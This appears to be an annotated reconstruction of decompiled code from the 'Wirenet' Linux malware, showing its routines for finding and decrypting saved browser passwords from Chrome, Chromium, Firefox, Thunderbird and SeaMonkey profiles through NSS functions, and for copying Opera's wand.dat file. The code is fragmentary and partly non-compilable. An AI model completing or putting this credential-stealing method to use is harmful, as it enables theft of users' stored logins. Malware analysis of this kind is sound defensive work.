

int32_t GetGoogleChromePasswords () {
  char v0; // dl@1
  int result; // eax@1
  char v2; // [sp+4h] [bp-110Ch]@1

  v0 = GetLoginDataPath((char *)4, &v2, 4352);
  result = 0;
  if ( v0 )
    result = DecryptLoginData(4, &v2);
  return result;
}

int32_t __attribute__((cdecl)) GetLoginDataPath (char * browser_name, char * result, int a3) {
	
  char * homepath;

  if ( name == (char *)4 )
  {
    homepath = getenv("HOME");
    __snprintf_chk(result, a3, 1, -1, "%s/.config/google-chrome/Default/Login Data", homepath);
  }
  else if ( name == (char *)5 )
  {
    homepath = getenv("HOME");
    __snprintf_chk(result, a3, 1, -1, "%s/.config/chromium/Default/Login Data", homepath);
  }

  return cpFileExists (result);
}

// arg_0 is used to choose which Mozilla product 'Wirenet' steals from
int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {

	char * homepath;
	char * profile_file_name;
	char * init;
	void * libhandle;
	sqlite3_stmt* stmt;
	sqlite3 **db_handle;

	// Attack seamonkey
	if (arg_0 == 6) {

		// If MozillaLibs not loaded
		if (  MozillaLibs... ) 
			handle = LoadMozillaLib();

		// Get the environment variable path
		homepath = getenv("HOME");

		// Initialize a string
		__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/seamonkey/profiles.ini", homepath);

		// Parses the profiles.ini file and extract the file name
		if ( ExtractProfileName(&init_string, profile_name, ...) ) {
			__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/seamonkey/%s", v7, &v43);
		}

	 	goto SUCCESS;
	}

	// Attack thunderbird
	if (arg_0 == 2) {

		__snprintf_chk(&init_string, ..., ..., ..., "%s/.thunderbird/profiles.ini", homepath)

		// Once again, the steps executed above are the same, just for thunderbird
		if ( ExtractProfileName(&init_string, profile_name, ...) ) {
			__snprintf_chk(&init_string, ..., ..., ..., "%s/.thunderbird/%s", v5, &v43);
		}

	 	goto SUCCESS;
	}

	// Attack firefox
	if (arg_0 == 1) {
		
		__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/firefox/profiles.ini", homepath);

		if ( ExtractProfileName (&init_string, profile_name, ...) ) {
			__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/firefox/%s", v3, &v43);
		}

	 	goto SUCCESS;
	}


EXIT:
	
	// Releases the dynamic library
	CleanUpMozilla ();
	return ;

SUCCESS:
	
	// Do the actual thing
	// Once the library is loaded into memory, there are some other things that
	// have to be done in before beign able to use the library functions

	cpGetProcAddress (handle , "NSS_Init");
	cpGetProcAddress (handle , "PK11_GetInternalKeySlot");
	cpGetProcAddress (handle , "NSSBase64_DecodeBuffer");
	cpGetProcAddress (handle , "PK11SDR_Decrypt");
	cpGetProcAddress (handle , "PK11_FreeSlot");
	cpGetProcAddress (handle , "NSS_Shutdown");
	cpGetProcAddress (handle , "sqlite3_open");
	cpGetProcAddress (handle , "sqlite3_close");
	cpGetProcAddress (handle , "sqlite3_prepare_v2");
	cpGetProcAddress (handle , "sqlite3_step");
	cpGetProcAddress (handle , "sqlite3_columne_text");
	
	// SQLite docs https://www.sqlite.org/c3ref/column_blob.html

	// Once everything is loaded, we're ready to open the database
	sqlite3_open("...", db_handle);

	// Prepare the statement
	sqlite3_prepare_v2 (database, "select *  from moz_logins", 25, stmt, ...);

	// SECStatus 	NSS_Init (const char *configdir)
	NSS_Init (...);

	// PK11_GetInternalKeySlot
	keySlot = PK11_GetInternalKeySlot();

	// 
	PK11_Authenticate (keySlot);

	// Get the return values of the previous query
	sqlite3_column_text (stmt, ...);

	// 
	// 
	NSSBase64_DecodeBuffer ();

 	// PK11SDR_Decrypt
 	//  Decrypt a block of data produced by PK11SDR_Encrypt. The key used is
 	//  identified by the keyid field within the input.
 	// 
 	// 
	PK11SDR_Decrypt ();

	// Evaluate the SQL statement to see if was executed successfully
	sqlite3_step ();

	goto EXIT;
}


// This function creates a copy of the '~/.opera/wand.dat',
// more info @ http://securityxploded.com/operapasswordsecrets.php
int32_t __attribute__((__cdecl)) GetOperaWand (uint32_t *a1) {
	// Get the content of the $HOME env var
	char * homepath = getenv("HOME");
	char * filename;
	...

  	filename = __snprintf_chk(&v9, 4352, 1, 4352, "%s/.opera/wand.dat", homepath);

  	// Opens a '~/.opera/wand.dat'
  	_fopen64 (filename, "rb");

  	// Gets the filesize
  	cpGetFileSize (...);

  	// Reads from the entire file
  	_fread (output, member_filesize, , input);
  	...

}